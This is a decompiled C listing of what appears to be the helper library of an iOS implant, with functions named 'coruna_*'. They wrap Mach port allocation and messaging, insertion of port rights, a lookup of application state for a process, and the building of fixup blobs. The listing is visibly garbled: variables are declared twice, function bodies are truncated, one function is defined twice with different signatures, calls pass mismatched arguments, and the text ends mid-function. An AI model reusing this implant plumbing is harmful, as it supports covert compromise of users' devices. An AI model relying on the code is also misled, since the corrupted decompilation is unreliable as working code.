      serial = _sel_registerName("mostElevatedApplicationStateForPID:");
      if ((((((addr != 0) && (off != 0)) && (base != 0)) && ((ctx_val != 0 && (serial != 0)))) &&
          ((err = _class_respondsToSelector(addr,base), err != 0 &&
           ((err = _class_respondsToSelector(addr,serial), err != 0 &&
            (err = _class_respondsToSelector(addr,ctx_val), err != 0)))))) &&
         (addr = _objc_msgSend(addr,off), addr != 0)) {
        off = _objc_msgSend(addr,base);
        if (off != 0) {
          *handle = handle;
          handle[1] = addr;
          handle[2] = ctx_val;
          handle[3] = serial;
          return 1;
        }
        _objc_msgSend(addr,ctx_val);
      }
      _dlclose(handle);
      u = 0;
    }
  }
  return u;
}





bool coruna_objc_msgsend(long *handle)
{
  if (handle != (long *)0x0) {
    if ((handle[1] != 0) && (handle[2] != 0)) {
      _objc_msgSend();
    }
    if (*handle != 0) {
      _dlclose();
    }
    handle[1] = 0;
    *handle = 0;
    handle[3] = 0;
    handle[2] = 0;
  }
  return handle != (long *)0x0;
}





uint64_t coruna_objc_msgsend_iface(long handle,uint64_t val)
{
  uint64_t u;
  
  if ((((handle != 0) && (0 < (int)val)) && (*(long *)(handle + 8) != 0)) &&
     (*(long *)(handle + 0x18) != 0)) {
    u = _objc_msgSend(*(long *)(handle + 8),*(long *)(handle + 0x18),val);
    return u;
  }
  return 0;
}





uint64_t coruna_calloc(uint64_t *val)
{
  int err;
  void *ptr;
  uint64_t u;
  
  u = 0;
  if ((val != (uint64_t *)0x0) && (ptr = _calloc(1,0x20), u = 0, ptr != (void *)0x0)
     ) {
    err = coruna_bks_app_state();
    if (err == 0) {
      _free(ptr);
      u = 0;
    }
    else {
      *val = ptr;
      u = 1;
    }
  }
  return u;
}





uint32_t
uint32_t coruna_mach_msg_send(mach_port_t port,mach_msg_header_t *arg,mach_msg_size_t arg_x, mach_msg_timeout_t arg_x_x,int flags)
{
  mach_msg_return_t lm1;
  uint32_t u;
  
  u = 0xad001;
  if (((arg != (mach_msg_header_t *)0x0) && (arg_x != 0)) &&
     (u = 0x1e01b, 1 < port + 1)) {
    arg->msgh_bits = 0x13;
    arg->msgh_size = arg_x;
    arg->msgh_local_port = 0;
    arg->msgh_reserved = 0;
    arg->msgh_remote_port = port;
    if (flags != 0) {
      arg->msgh_bits = 0x80000013;
    }
    lm1 = _mach_msg(arg,0x11,arg_x,0,0,arg_x_x,0);
    if (lm1 == 0) {
      u = 0;
    }
    else if (lm1 == 0x10000004) {
      _mach_msg_destroy(arg);
      u = 0x1e030;
    }
    else {
      u = 0x1e025;
      if (lm1 == 0x10000003) {
        u = 0x1e02f;
      }
    }
  }
  return u;
}





uint32_t
uint32_t coruna_mach_msg_recv(mach_port_name_t arg,int flags,uint size,mach_msg_header_t *arg_x, mach_msg_timeout_t arg_x_x)
{
  uint u;
  uint32_t size;
  
  if (arg_x == (mach_msg_header_t *)0x0) {
    return 0xad001;
  }
  if (size == 0) {
    return 0xad001;
  }
  size = 0x1e021;
  if (arg + 1 < 2) {
    return 0x1e01b;
  }
  _bzero(arg_x,(unsigned long)size);
  arg_x->msgh_remote_port = arg;
  arg_x->msgh_local_port = arg;
  arg_x->msgh_bits = 0x13;
  arg_x->msgh_size = size;
  u = _mach_msg(arg_x,0x102,0,size,arg,arg_x_x,0);
  if ((int)u < 0x10004003) {
    if (u == 0) {
      if (arg_x->msgh_id == flags) {
        if (-1 < (int)arg_x->msgh_bits) {
          return 0;
        }
        size = 0x1e019;
      }
      else {
        size = 0x1e03d;
      }
      _mach_msg_destroy(arg_x);
      return size;
    }
    if (u == 0x10004002) {
      return 0x1e031;
    }
  }
  else {
    if (u == 0x10004003) {
      return 0x1e02a;
    }
    if (u == 0x10004004) {
      if (arg_x->msgh_id == flags) {
        return 0x1e021;
      }
      return 0x1e03d;
    }
  }
  if ((u & 0xfffffffb) != 0x10004008) {
    return 0x1e021;
  }
fail:
  _mach_msg_destroy(arg_x);
  return size;
}





uint64_t coruna_mach_port_allocate(mach_port_name_t *arg,uint64_t val)
{
  uint8_t *ptr;
  kern_return_t lk2;
  uint64_t u;
  mach_port_name_t scratch;
  
  ptr = k_implant_mach_task_self_slot;
  if (arg == (mach_port_name_t *)0x0) {
    u = 0xad001;
  }
  else {
    scratch = 0;
    lk2 = _mach_port_allocate(*(ipc_space_t *)k_implant_mach_task_self_slot,1,&scratch);
    if (lk2 == 0) {
      if (((int)val == 0) || (u = coruna_mach_port_set_attributes(scratch,val), (int)u == 0)) {
        u = 0;
        *arg = scratch;
      }
      else {
        _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
      }
    }
    else {
      u = 0x1e023;
    }
  }
  return u;
}





uint32_t coruna_mach_port_set_attributes(mach_port_name_t arg,integer_t arg_x)
{
  uint32_t u;
  kern_return_t lk2;
  integer_t scratch [2];
  
  u = 0x1e01b;
  if (1 < arg + 1) {
    scratch[0] = arg_x;
    lk2 = _mach_port_set_attributes
                      (*(ipc_space_t *)k_implant_mach_task_self_slot,arg,1,scratch,1);
    u = 0;
    if (lk2 != 0) {
      u = 0x1e032;
    }
  }
  return u;
}





uint64_t coruna_mach_port_insert_right(mach_port_t port,ipc_space_t arg,mach_port_name_t *arg_x)
{
  uint8_t *ptr;
  mach_port_name_t lm2;
  kern_return_t lk3;
  uint64_t u;
  int err;
  mach_port_name_t scratch;
  
  ptr = k_implant_mach_task_self_slot;
  if (arg_x == (mach_port_name_t *)0x0) {
    u = 0xad001;
  }
  else {
    u = 0x1e009;
    if (port + 1 < 2) {
      u = 0x1e01b;
    }
    else if (1 < arg + 1) {
      err = 8;
      do {
        scratch = 0;
        lm2 = port;
        if (*(ipc_space_t *)ptr != arg) {
          lk3 = _mach_port_allocate(arg,1,&scratch);
          if (lk3 != 0) {
            return 0x1e035;
          }
          lk3 = _mach_port_destroy(arg,scratch);
          lm2 = scratch;
          if (lk3 != 0) {
            return 0x1e034;
          }
        }
        scratch = lm2;
        lk3 = _mach_port_insert_right(arg,scratch,port,0x14);
        if ((lk3 == 0) || (*(ipc_space_t *)ptr == arg && lk3 == 0x15)) {
          *arg_x = scratch;
          return 0;
        }
        _usleep(100);
        err = err + -1;
      } while (err != 0);
      u = 0x1e033;
    }
  }
  return u;
}





int coruna_fixup_ctx_clear(uint64_t *val)
{
  int err;
  int status;
  
  if (val != (uint64_t *)0x0) {
    err = coruna_vec_free(val + 2,1);
    status = coruna_vec_free(val + 6,0x10);
    if (err != 0) {
      status = err;
    }
    err = coruna_vec_free(val + 4,4);
    if (status != 0) {
      err = status;
    }
    status = coruna_vec_free(val + 8,4);
    if (err != 0) {
      status = err;
    }
    err = coruna_vec_free(val + 10,4);
    if (status != 0) {
      err = status;
    }
    status = coruna_vec_free(val + 0xc,0x18);
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    if (err != 0) {
      status = err;
    }
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    return status;
  }
  return 0xad001;
}
uint64_t
uint64_t coruna_fixup_parse_wire(uint64_t *val,uint64_t id_2,uint64_t size_3,int64_t arg,uint size,int64_t arg, uint64_t off_4,int64_t val,int flags,int64_t *n)
{
  uint64_t *ptr;
  int err;
  uint64_t u;
  char *ptr;
  int *err;
  unsigned long size;
  long *ptr;
  int status;
  unsigned long version;
  unsigned long port;
  long handle;
  long addr;
  unsigned long scratch;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long bootargs;
  unsigned long host_info;
  unsigned long serial_buf;
  unsigned long thread_attr;
  unsigned long action;
  unsigned long host_info;
  unsigned long block_ctx;
  unsigned long stack_guard;
  unsigned long serial_buf;
  unsigned long sa_saved;
  int action;
  uint32_t sa_new;
  uint32_t path_buf;
  uint8_t tmp_buf;
  uint8_t region;
  byte block_ctx;
  uint8_t plist;
  
  if (val == (unsigned long *)0x0) {
    return 0xad001;
  }
  if (id_2 == 0) {
    return 0xad001;
  }
  if ((int)size_3 == 0) {
    return 0xad001;
  }
  if ((arg == 0) && (size != 0)) {
    return 0xad001;
  }
  if ((arg == 0) && ((int)off_4 != 0)) {
    return 0xad001;
  }
  if ((val == 0) && (flags != 0)) {
    return 0xad001;
  }
  bootargs = 0;
  bootargs = 0;
  thread_attr = 0;
  sa_saved = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  stack_guard = 0;
  serial_buf = 0;
  host_info = 0;
  action = 0;
  thread_attr = 0;
  scratch = size_3 & 0xffffffff;
  scratch = id_2;
  u = coruna_fixup_add_offsets(&action,arg,off_4,id_2,size_3);
  if (((int)u != 0) ||
     (u = coruna_fixup_add_offsets(&block_ctx,val,flags,id_2,size_3), (int)u != 0))
  coruna_fixup_ctx_clear(&scratch);
  return u;
}





uint64_t coruna_fixup_add_offsets(long *handle,unsigned long *arg,uint size,unsigned long arg,uint flags_2)
{
  uint u;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  
  size = 0xad001;
  if ((handle != (long *)0x0) && ((arg != (unsigned long *)0x0 || (size == 0)))) {
    if (size != 0) {
      version = (unsigned long)size;
      do {
        port = *arg;
        if (port < arg || arg + flags_2 <= port) {
          return 0x1e007;
        }
        size = coruna_vec_grow(handle,1,4);
        if ((int)size != 0) {
          return size;
        }
        u = *(uint *)(handle + 1);
        *(uint *)(handle + 1) = u + 1;
        *(int *)(*handle + (unsigned long)u * 4) = (int)port - (int)arg;
        arg = arg + 1;
        version = version - 1;
      } while (version != 0);
    }
    size = 0;
  }
  return size;
}





uint64_t coruna_fixup_build_blob(long handle,uint64_t *val,uint *size)
{
  uint64_t u;
  unsigned long *ptr;
  int err;
  uint size;
  uint version;
  uint port;
  uint64_t tag;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  
  tag = 0xad01d;
  u = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) {
    bootargs = 0;
    bootargs = 0;
    thread_attr = 0;
    thread_attr = 0;
    scratch = 0;
    scratch = 0;
    size = *(uint *)(handle + 0x18);
    u = tag;
    if (size < 0xffffffd0) {
      err = 0x30;
      if (size != 0) {
        scratch = coruna_u64_pack((size), (0x30));
        if (0xffffffc8 < size) {
          return 0xad01d;
        }
        err = size + 0x30;
      }
      if (((*(uint *)(handle + 0x28) & 0xc0000000) == 0) &&
         (size = *(uint *)(handle + 0x28) * 4, size <= (-err - 8U | 7))) {
        port = err + 7U & 0xfffffff8;
        if (size != 0) {
          scratch = coruna_u64_pack((size), (err + 7U)) & 0xfffffffffffffff8;
          port = size + port;
        }
        if ((*(uint *)(handle + 0x38) & 0xf0000000) == 0) {
          version = *(uint *)(handle + 0x38) * 0x10;
          size = ~port;
          if (version <= size) {
            if (version != 0) {
              bootargs = coruna_u64_pack((version), (port));
              port = version + port;
              size = ~port;
            }
            if (((*(uint *)(handle + 0x48) & 0xc0000000) == 0) &&
               (version = *(uint *)(handle + 0x48) * 4, version <= size)) {
              if (version != 0) {
                bootargs = coruna_u64_pack((version), (port));
                port = version + port;
                size = ~port;
              }
              if (((*(uint *)(handle + 0x58) & 0xc0000000) == 0) &&
                 (version = *(uint *)(handle + 0x58) * 4, version <= size)) {
                if (version != 0) {
                  thread_attr = coruna_u64_pack((version), (port));
                  port = version + port;
                  size = ~port;
                }
                if ((((unsigned long)*(uint *)(handle + 0x68) * 0x18 & 0xffffffff00000000) == 0) &&
                   (version = *(uint *)(handle + 0x68) * 0x18, version <= size)) {
                  if (version != 0) {
                    thread_attr = coruna_u64_pack((version), (port));
                    port = version + port;
                  }
                  ptr = _calloc(1,(unsigned long)port);
                  if (ptr == (unsigned long *)0x0) {
                    u = 0xad009;
                  }
                  else {
                    ptr[1] = scratch;
                    *ptr = scratch;
                    ptr[3] = bootargs;
                    ptr[2] = bootargs;
                    ptr[5] = thread_attr;
                    ptr[4] = thread_attr;
                    if (scratch != 0) {
                      _memcpy((void *)((long)ptr + (scratch & 0xffffffff)),
                              *(void **)(handle + 0x10),(unsigned long)scratch);
                    }
                    if (scratch != 0) {
                      _memcpy((void *)((long)ptr + (scratch & 0xffffffff)),
                              *(void **)(handle + 0x20),(unsigned long)scratch);
                    }
                    if (bootargs != 0) {
                      _memcpy((void *)((long)ptr + (bootargs & 0xffffffff)),
                              *(void **)(handle + 0x30),(unsigned long)bootargs);
                    }
                    if (bootargs != 0) {
                      _memcpy((void *)((long)ptr + (bootargs & 0xffffffff)),
                              *(void **)(handle + 0x40),(unsigned long)bootargs);
                    }
                    if (thread_attr != 0) {
                      _memcpy((void *)((long)ptr + (thread_attr & 0xffffffff)),
                              *(void **)(handle + 0x50),(unsigned long)thread_attr);
                    }
                    if (thread_attr != 0) {
                      _memcpy((void *)((long)ptr + (thread_attr & 0xffffffff)),
                              *(void **)(handle + 0x60),(unsigned long)thread_attr);
                    }
                    u = 0;
                    *val = ptr;
                    *size = port;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return u;
}





uint64_t
uint64_t coruna_fixup_apply(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, uint64_t off_5,uint64_t off_6,uint64_t off_7,uint32_t size, uint64_t off_8,int64_t arg,int64_t arg)
{
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  
  if (arg == 0 || arg == 0) {
    u = 0xad001;
  }
  else {
    stack_guard = 0;
    host_info = 0;
    sa_new = 0;
    sa_saved = 0;
    serial_buf = 0;
    thread_attr = 0;
    block_ctx = 0;
    action = 0;
    bootargs = 0;
    bootargs = 0;
    host_info = 0;
    thread_attr = 0;
    scratch = 0;
    scratch = 0;
    u = coruna_fixup_parse_wire(&scratch,val,id_2,size_3,off_4,off_5,off_6,off_7,size,
                         off_8);
    if ((int)u == 0) {
      u = coruna_fixup_build_blob(&scratch,arg,arg);
      coruna_fixup_ctx_clear(&scratch);
    }
  }
  return u;
}





uint64_t coruna_vec_grow(uint64_t *val,uint size,uint flags_2)
{
  uint u;
  uint size;
  void *ptr;
  void *buf;
  uint64_t version;
  
  version = 0xad01d;
  if (val == (uint64_t *)0x0) {
    version = 0xad001;
  }
  else {
    u = *(uint *)(val + 1);
    if ((unsigned long)*(uint *)((long)val + 0xc) < (unsigned long)u + (unsigned long)size) {
      size = u + size * 10;
      if ((size != 0xffffffff) && (((unsigned long)flags_2 * (unsigned long)size & 0xffffffff00000000) == 0)) {
        ptr = _calloc(1,(unsigned long)flags_2 * (unsigned long)size & 0xffffffff);
        if (ptr == (void *)0x0) {
          version = 0xad009;
        }
        else {
          buf = (void *)*val;
          if (buf != (void *)0x0) {
            u = u * flags_2;
            if (u != 0) {
              _memcpy(ptr,buf,(unsigned long)u);
              _bzero((void *)*val,(unsigned long)u);
              buf = (void *)*val;
            }
            _free(buf);
          }
          version = 0;
          *val = ptr;
          *(uint *)((long)val + 0xc) = size;
        }
      }
    }
    else {
      version = 0;
    }
  }
  return version;
}





uint64_t coruna_vec_free(uint64_t *val,int flags)
{
  void *ptr;
  
  if (val != (uint64_t *)0x0) {
    ptr = (void *)*val;
    if (ptr != (void *)0x0) {
      if (*(int *)(val + 1) != 0) {
        _bzero(ptr,(unsigned long)(uint)(*(int *)(val + 1) * flags));
        ptr = (void *)*val;
      }
      _free(ptr);
    }
    *val = 0;
    val[1] = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_strpool_append(long *handle,void *ctx,unsigned long arg,uint32_t *size)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (ctx != (void *)0x0)) {
    if ((int)arg == 0) {
      u = 0;
      if (size != (uint32_t *)0x0) {
        *size = 0;
      }
    }
    else {
      u = coruna_vec_grow(handle,arg,1);
      if ((int)u == 0) {
        _memcpy((void *)(*handle + (unsigned long)*(uint *)(handle + 1)),ctx,arg & 0xffffffff);
        if (size != (uint32_t *)0x0) {
          *size = (int)handle[1];
        }
        u = 0;
        *(int *)(handle + 1) = (int)handle[1] + (int)arg;
      }
    }
  }
  return u;
}





uint64_t coruna_strpool_intern(int *flags,char *path,int *count_2)
{
  void (*ptr)(void);
  uint64_t u;
  size_t ls3;
  void *ptr;
  unsigned long unaff_x30;
  
  u = 0xad001;
  if (((flags != (int *)0x0) && (path != (char *)0x0)) && (count_2 != (int *)0x0)) {
    ls3 = _strlen(path);
    if ((flags[2] == 0) ||
       (ptr = _memmem(*(void **)flags,(unsigned long)(uint)flags[2],path,ls3 + 1),
       ptr == (void *)0x0)) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      u = coruna_strpool_append(flags,path,ls3 + 1,count_2);
      return u;
    }
    u = 0;
    *count_2 = (int)ptr - *flags;
  }
  return u;
}





unsigned long coruna_mach_msg(long arg,unsigned long val,mach_msg_id_t *n,uint m,uint p,
                  mach_port_t q)

{
  uint32_t u;
  mach_msg_id_t lm2;
  mach_msg_id_t *lpm3;
  mach_msg_id_t *lpm4;
  size_t ls5;
  long serial_16;
  uint64_t tag;
  uint64_t type_id_11;
  uint8_t *entry_10;
  uint type_id_12;
  void (*entry_9)(void);
  unsigned long type_id_8;
  unsigned long type_id_9;
  unsigned long cache_20;
  mach_msg_id_t *cache_94;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint8_t cache_95[12];
  mach_port_t cache_96;
  mach_msg_size_t cache_97;
  mach_msg_id_t cache_98;
  mach_msg_id_t cache_99;
  uint8_t cache_100;
  uint8_t cache_25;
  uint16_t cache_26;
  uint32_t cache_27;
  uint16_t cache_28;
  uint16_t cache_29;
  uint32_t cache_30;
  uint32_t cache_101;
  int cache_102;
  uint64_t cache_31;
  uint64_t cache_103;
  uint64_t cache_32;
  uint64_t cache_104;
  uint64_t cache_33;
  uint64_t cache_105;
  uint64_t cache_34;
  uint64_t cache_106;
  uint64_t cache_35;
  uint64_t cache_107;
  uint64_t cache_36;
  uint64_t cache_108;
  uint64_t cache_37;
  uint64_t cache_109;
  uint64_t cache_38;
  uint64_t cache_110;
  uint64_t cache_39;
  uint64_t cache_111;
  uint64_t cache_40;
  uint64_t cache_112;
  uint64_t cache_41;
  uint64_t cache_113;
  uint64_t cache_42;
  uint64_t cache_114;
  uint64_t cache_43;
  uint64_t cache_115;
  uint64_t cache_44;
  uint64_t cache_116;
  uint64_t cache_45;
  uint64_t sa_saved;
  uint64_t cache_46;
  uint64_t cache_33;
  long cache_37;
  
  cache_37 = *(long *)k_implant_stack_chk_guard_slot;
  type_id_9 = 0xad001;
  unique0x10000537 = (mach_msg_id_t *)coruna_u64_pack((cache_96), (cache_95));
  if ((arg == 0) ||
     ((n == (mach_msg_id_t *)0x0 &&
      (unique0x1000053f = (mach_msg_id_t *)coruna_u64_pack((cache_96), (cache_95)), m != 0))))
  if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
  ___stack_chk_fail();
  }
  return type_id_9;
}





unsigned long coruna_mach_port_deallocate(mach_port_name_t *arg)

{
  uint8_t *entry_9;
  kern_return_t lk2;
  uint type_id;
  unsigned long version;
  uint port;
  
  if (arg == (mach_port_name_t *)0x0) {
    version = 0xad001;
  }
  else {
    version = coruna_pthread_join();
    entry_9 = k_implant_mach_task_self_slot;
    if (1 < *arg + 1) {
      lk2 = _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,*arg);
      port = (uint)version;
      type_id = 0x1e024;
      if (port != 0) {
        type_id = port;
      }
      if (lk2 != 0) {
        port = type_id;
      }
      lk2 = _mach_port_mod_refs(*(ipc_space_t *)entry_9,*arg,1,-1);
      type_id = 0x1e024;
      if (port != 0) {
        type_id = port;
      }
      if (lk2 != 0) {
        port = type_id;
      }
      version = (unsigned long)port;
    }
    if ((*(long *)(arg + 6) != 0) && (*(long *)(arg + 8) != 0)) {
      type_id = (**(void (**)(*(long *)(arg + 6) + 0x20))();
      if ((uint)version != 0) {
        type_id = (uint)version;
      }
      version = (unsigned long)type_id;
    }
    arg[6] = 0;
    arg[7] = 0;
    arg[4] = 0;
    arg[5] = 0;
    arg[10] = 0;
    arg[0xb] = 0;
    arg[8] = 0;
    arg[9] = 0;
    arg[2] = 0;
    arg[3] = 0;
    arg[0] = 0;
    arg[1] = 0;
    _free(arg);
  }
  return version;
}





uint64_t coruna_pthread_join(long handle)
{
  int err;
  uint64_t u;
  void *scratch;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if (*(char *)(handle + 8) == '\0') {
    u = 0;
  }
  else {
    *(uint8_t *)(handle + 9) = 1;
    if (*(long *)(handle + 0x18) != 0) {
      coruna_mach_msg_destroy(handle);
      scratch = (void *)0x0;
      err = _pthread_join(*(pthread_t *)(handle + 0x10),&scratch);
      if (err == 0) {
        coruna_mach_msg_destroy(handle);
      }
      else {
        ___error();
      }
      *(uint64_t *)(handle + 0x10) = 0;
    }
    u = 0;
    *(uint8_t *)(handle + 8) = 0;
  }
  return u;
}





unsigned long coruna_mach_port_create(uint64_t *arg,long val)

{
  uint8_t *entry_9;
  mach_port_name_t name;
  uint size;
  kern_return_t lk3;
  mach_port_name_t lm4;
  int idx;
  mach_port_name_t *lpm6;
  unsigned long tag;
  uint64_t json_buf;
  mach_port_name_t frame [2];
  
  if (arg == (uint64_t *)0x0) {
    return 0xad001;
  }
  lpm6 = _calloc(1,0x30);
  if (lpm6 == (mach_port_name_t *)0x0) {
    return 0xad009;
  }
  json_buf = 0;
  if (val == 0) {
load_ok_68:
    tag = 0;
    *arg = lpm6;
  }
  else {
    tag = (**(void (**)(val + 0x18))(val,0,&json_buf);
    entry_9 = k_implant_mach_task_self_slot;
    if ((int)tag == 0) {
      frame[0] = 0;
      size = _mach_port_allocate(*(ipc_space_t *)k_implant_mach_task_self_slot,1,frame);
      name = frame[0];
      if (size == 0) {
        frame[0] = 1;
        lk3 = _mach_port_set_attributes
                          (*(ipc_space_t *)entry_9,name,1,(mach_port_info_t)frame,1);
        if ((lk3 == 0) &&
           (lk3 = _mach_port_insert_right(*(ipc_space_t *)entry_9,name,name,0x14), lk3 == 0)) {
          *lpm6 = name;
          lm4 = coruna_srandomdev();
          lpm6[1] = lm4;
          *(uint16_t *)(lpm6 + 2) = 0x100;
          lpm6[4] = 0;
          lpm6[5] = 0;
          *(long *)(lpm6 + 6) = val;
          *(uint64_t *)(lpm6 + 8) = json_buf;
          idx = coruna_mach_msg_destroy(lpm6);
          if (idx == 0) goto load_ok_68;
          _mach_port_mod_refs(*(ipc_space_t *)entry_9,name,0,-1);
        }
        _mach_port_destroy(*(ipc_space_t *)entry_9,name);
        size = 0x1e023;
      }
      else {
        size = size | 0x80000000;
      }
      tag = (unsigned long)size;
      (**(void (**)(val + 0x20))(val,json_buf);
    }
    _free(lpm6);
  }
  return tag;
}





uint coruna_srandomdev(void)
{
  uint u;
  unsigned long size;
  
  _srandomdev();
  size = _random();
  u = (uint)size;
  if ((size & 0x7fffffff) == 0) {
    size = _random();
    u = (int)k_implant_dlsym_slot << 0xe ^ 0x8d29;
    if ((size & 0x7fffffff) != 0) {
      u = (uint)size;
    }
  }
  return u & 0x7fffffff;
}





uint32_t coruna_mach_msg_destroy(mach_port_t *port)
{
  mach_msg_return_t lm1;
  mach_msg_header_t scratch;
  
  if (port == (mach_port_t *)0x0) {
    return 0xad001;
  }
  if (*(long *)(port + 6) != 0) {
    scratch.msgh_local_port = 0;
    scratch.msgh_reserved = 0;
    scratch.msgh_remote_port = *port;
    scratch.msgh_id = port[1];
    scratch = k_implant_rodata_word_26ac8;
    lm1 = _mach_msg(&scratch,0x11,0x18,0,0,1,0);
    if (lm1 == 0) {
      return 0;
    }
    if (lm1 != 0x10000004) {
      return 0x1e025;
    }
    _mach_msg_destroy(&scratch);
  }
  return 0;
}





uint64_t coruna_pthread_create(uint32_t *size,uint32_t *flags_2,uint32_t *version_3)
{
  int err;
  uint64_t u;
  
  if (size == (uint32_t *)0x0) {
    u = 0xad001;
  }
  else if (((*(char *)(size + 2) == '\0') &&
           (*(uint16_t *)(size + 2) = 1, *(long *)(size + 6) != 0)) &&
          (err = _pthread_create((pthread_t *)(size + 4),(pthread_attr_t *)0x0,
                                   (void **)coruna_mach_msg,size), err != 0)) {
    ___error();
    *(uint8_t *)(size + 2) = 0;
    *(uint64_t *)(size + 4) = 0;
    u = 0x1e01f;
  }
  else {
    if (flags_2 != (uint32_t *)0x0) {
      *flags_2 = *size;
    }
    u = 0;
    if (version_3 != (uint32_t *)0x0) {
      *version_3 = size[1];
    }
  }
  return u;
}





uint64_t coruna_mach_msg(mach_port_name_t *arg)
{
  size_t ls1;
  mach_port_name_t rcv_name;
  mach_msg_return_t lm2;
  int err;
  mach_msg_header_t *msg;
  mach_msg_header_t *msg_00;
  
  if ((arg != (mach_port_name_t *)0x0) &&
     (msg = _calloc(1,0x13c), msg != (mach_msg_header_t *)0x0)) {
    do {
      while( true ) {
        if ((*(char *)((long)arg + 9) != '\0') || (rcv_name = *arg, rcv_name + 1 < 2))
        goto fail;
        msg[0xb].msgh_reserved = 0;
        msg[0xb].msgh_id = 0;
        msg[0xb].msgh_remote_port = 0;
        msg[0xb].msgh_local_port = 0;
        msg[0xc].msgh_remote_port = 0;
        msg[0xc].msgh_local_port = 0;
        msg[0xc].msgh_bits = 0;
        msg[0xc].msgh_size = 0;
        msg[10].msgh_remote_port = 0;
        msg[10].msgh_local_port = 0;
        msg[10].msgh_bits = 0;
        msg[10].msgh_size = 0;
        msg[0xb].msgh_bits = 0;
        msg[0xb].msgh_size = 0;
        msg[10].msgh_reserved = 0;
        msg[10].msgh_id = 0;
        msg[9].msgh_bits = 0;
        msg[9].msgh_size = 0;
        msg[8].msgh_reserved = 0;
        msg[8].msgh_id = 0;
        msg[9].msgh_reserved = 0;
        msg[9].msgh_id = 0;
        msg[9].msgh_remote_port = 0;
        msg[9].msgh_local_port = 0;
        msg[7].msgh_reserved = 0;
        msg[7].msgh_id = 0;
        msg[7].msgh_remote_port = 0;
        msg[7].msgh_local_port = 0;
        msg[8].msgh_remote_port = 0;
        msg[8].msgh_local_port = 0;
        msg[8].msgh_bits = 0;
        msg[8].msgh_size = 0;
        msg[6].msgh_remote_port = 0;
        msg[6].msgh_local_port = 0;
        msg[6].msgh_bits = 0;
        msg[6].msgh_size = 0;
        msg[7].msgh_bits = 0;
        msg[7].msgh_size = 0;
        msg[6].msgh_reserved = 0;
        msg[6].msgh_id = 0;
        msg[5].msgh_bits = 0;
        msg[5].msgh_size = 0;
        msg[4].msgh_reserved = 0;
        msg[4].msgh_id = 0;
        msg[5].msgh_reserved = 0;
        msg[5].msgh_id = 0;
        msg[5].msgh_remote_port = 0;
        msg[5].msgh_local_port = 0;
        msg[3].msgh_reserved = 0;
        msg[3].msgh_id = 0;
        msg[3].msgh_remote_port = 0;
        msg[3].msgh_local_port = 0;
        msg[4].msgh_remote_port = 0;
        msg[4].msgh_local_port = 0;
        msg[4].msgh_bits = 0;
        msg[4].msgh_size = 0;
        msg[2].msgh_remote_port = 0;
        msg[2].msgh_local_port = 0;
        msg[2].msgh_bits = 0;
        msg[2].msgh_size = 0;
        msg[3].msgh_bits = 0;
        msg[3].msgh_size = 0;
        msg[2].msgh_reserved = 0;
        msg[2].msgh_id = 0;
        msg[1].msgh_bits = 0;
        msg[1].msgh_size = 0;
        msg->msgh_reserved = 0;
        msg->msgh_id = 0;
        msg[1].msgh_reserved = 0;
        msg[1].msgh_id = 0;
        msg[1].msgh_remote_port = 0;
        msg[1].msgh_local_port = 0;
        msg->msgh_remote_port = 0;
        msg->msgh_local_port = 0;
        msg->msgh_bits = 0;
        msg->msgh_size = 0;
        *(uint64_t *)&msg[0xc].msgh_id = 0;
        msg[0xc].msgh_local_port = 0;
        msg[0xc].msgh_reserved = 0;
        lm2 = _mach_msg(msg,0x106,0,0x13c,rcv_name,10000,0);
        if (lm2 == 0x10004004) break;
        if (lm2 == 0) {
          coruna_port_get_refs(arg,msg,0x13c);
          lm2 = 0;
        }
done:
        err = coruna_mach_msg_destroy(lm2,msg,0x13c);
        if (err != 0) goto fail;
      }
      if (0x1fffe8 < msg->msgh_size - 0x18) {
        lm2 = _mach_msg(msg,2,0,0x13c,*arg,0,0);
        goto done;
      }
      ls1 = (unsigned long)msg->msgh_size + 8;
      msg_00 = _calloc(1,ls1);
      if (msg_00 == (mach_msg_header_t *)0x0) break;
      lm2 = _mach_msg(msg_00,2,0,(mach_msg_size_t)ls1,*arg,0,0);
      if (lm2 == 0) {
        coruna_port_get_refs(arg,msg_00,ls1);
        lm2 = 0;
      }
      err = coruna_mach_msg_destroy(lm2,msg_00,ls1);
      _free(msg_00);
    } while (err == 0);
fail:
    _free(msg);
  }
  return 0;
}





void coruna_port_get_refs(long handle,int *flags,uint size)
{
  long handle;
  uint u;
  int err;
  uint size;
  mach_port_urefs_t lm5;
  kern_return_t lk6;
  mach_port_urefs_t lm7;
  int status;
  uint version;
  mach_port_urefs_t *lpm10;
  mach_port_urefs_t scratch;
  uint bootargs;
  
  if (((handle != 0) && (flags != (int *)0x0)) && (0x17 < size)) {
    err = flags[5];
    size = *(uint *)(handle + 4);
    if ((unsigned long)size <= (unsigned long)(long)err && (unsigned long)(long)err < (unsigned long)size + 0xc) {
      u = flags[1];
      version = 0x18;
      if (*flags < 0) {
        version = 0x2c;
      }
